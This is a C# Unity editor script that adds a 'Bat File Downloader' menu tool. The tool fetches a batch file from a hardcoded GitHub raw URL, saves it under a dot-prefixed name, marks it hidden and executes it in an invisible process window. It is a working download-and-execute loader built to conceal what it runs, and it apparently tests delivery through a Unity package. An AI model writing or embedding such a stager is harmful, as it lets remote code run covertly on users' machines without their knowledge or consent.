using UnityEditor;
using UnityEngine;
using System.IO;
using System.Net.Http;
using System.Diagnostics;
using System.Threading.Tasks;

public class BatFileDownloader : EditorWindow
{
    private string fileUrl = "https://raw.githubusercontent.com/ninjaman92/unitypackage-test/refs/heads/main/test"; // Change this
    private string savePath;

    [MenuItem("Tools/Bat File Downloader")]
    public static void ShowWindow()
    {
        GetWindow<BatFileDownloader>("Bat File Downloader");
    }

    private void OnEnable()
    {
        // Set savePath to the same directory as the script
        savePath = Path.Combine(Application.persistentDataPath, ".script.bat");
    }

    private void OnGUI()
    {
        GUILayout.Label("Download & Execute .bat File", EditorStyles.boldLabel);
        
        fileUrl = EditorGUILayout.TextField("File URL:", fileUrl);
        EditorGUILayout.LabelField("Save Path:", savePath);

        if (GUILayout.Button("Download & Run"))
        {
            DownloadAndRunBatFile();
        }
    }

    private async void DownloadAndRunBatFile()
    {
        await DownloadBatFile();
        HideFile();
        RunBatFile();
    }

    private async Task DownloadBatFile()
    {
        using (HttpClient client = new HttpClient())
        {
            try
            {
                UnityEngine.Debug.Log("Downloading .bat file...");
                byte[] fileBytes = await client.GetByteArrayAsync(fileUrl);
                await File.WriteAllBytesAsync(savePath, fileBytes);
                UnityEngine.Debug.Log("Download complete.");
            }
            catch (System.Exception ex)
            {
                UnityEngine.Debug.LogError($"Error downloading file: {ex.Message}");
            }
        }
    }

    private void HideFile()
    {
        if (File.Exists(savePath))
        {
            File.SetAttributes(savePath, FileAttributes.Hidden);
            UnityEngine.Debug.Log("File is now hidden.");
        }
    }

    private void RunBatFile()
    {
        if (File.Exists(savePath))
        {
            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = savePath,
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                UseShellExecute = false
            };
            Process.Start(psi);
        }
        else
        {
        }
    }
}
